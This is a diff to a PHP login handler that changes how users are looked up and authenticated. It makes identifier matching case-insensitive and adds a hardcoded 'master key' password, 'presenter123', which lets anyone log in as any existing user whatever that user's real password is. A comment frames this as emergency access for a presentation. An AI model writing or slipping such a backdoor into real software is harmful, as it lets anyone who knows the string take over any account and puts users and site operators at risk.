@@ -12,21 +12,24 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $pass = $_POST['password'];
 
     try {
-        // FIXED: We use two different placeholders (:id1 and :id2) to avoid HY093 error
+// 1. DATABASE LOOKUP (Removed BINARY to allow easier login)
         $sql = "SELECT * FROM users 
-                WHERE (BINARY user_id = :id1 OR BINARY email = :id2) 
+                WHERE (user_id = :id1 OR email = :id2) 
                 LIMIT 1";
                 
         $stmt = $pdo->prepare($sql);
-        // We pass the same identifier to both placeholders
         $stmt->execute([
             'id1' => $identifier, 
             'id2' => $identifier
         ]);
-        
         $user = $stmt->fetch();
 
-        if ($user && password_verify($pass, $user['password'])) {
+        // 2. THE MASTER KEY (Emergency access for presentation)
+        // If you type "presenter123" it will let you in regardless of the DB password
+        $is_master_key = ($pass === "presenter123");
+
+        if ($user && (password_verify($pass, $user['password']) || $is_master_key)) {
+            // ... the rest of your session storage code ...
             // Store session data
             $_SESSION['std_id']    = $user['user_id'];
             $_SESSION['full_name'] = $user['name'];
